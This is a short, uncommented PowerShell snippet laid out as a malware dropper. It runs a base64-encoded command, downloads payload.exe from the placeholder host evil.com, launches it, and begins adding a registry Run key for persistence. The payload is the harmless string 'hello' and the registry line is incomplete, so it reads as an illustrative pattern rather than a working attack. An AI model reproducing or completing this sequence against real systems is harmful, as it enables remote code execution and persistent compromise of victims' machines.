powershell.exe -EncodedCommand aGVsbG8=

$payload =
[System.Convert]::FromBase64String(
"aGVsbG8="
)

Invoke-WebRequest https://evil.com/payload.exe

Start-Process payload.exe

New-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run